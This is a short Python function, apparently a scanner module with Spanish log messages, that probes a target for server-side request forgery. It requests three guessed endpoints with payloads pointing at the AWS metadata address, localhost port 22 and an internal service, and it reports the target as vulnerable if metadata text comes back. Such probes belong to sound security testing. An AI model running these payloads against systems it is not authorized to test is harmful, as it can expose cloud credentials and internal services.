import requests

def execute(target):
    print(f"[INFO] Probando SSRF en: {target}")
    endpoints = ["/api/proxy", "/admin/test", "/fetch"]
    payloads = [
        "http://169.254.169.254/latest/meta-data/",  # AWS Metadata
        "http://127.0.0.1:22",  # Localhost Port
        "http://internal-service:8080"
    ]
    vulnerable = False

    for endpoint in endpoints:
        for payload in payloads:
            url = f"http://{target}{endpoint}?url={payload}"
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200 and "meta-data" in response.text:
                    vulnerable = True
                    print(f"[ALERTA] SSRF detectado en {url} con payload: {payload}")
            except Exception as e:
                print(f"[ERROR] Error al probar SSRF en {url}: {e}")
    return "Vulnerable a SSRF" if vulnerable else "No vulnerable"
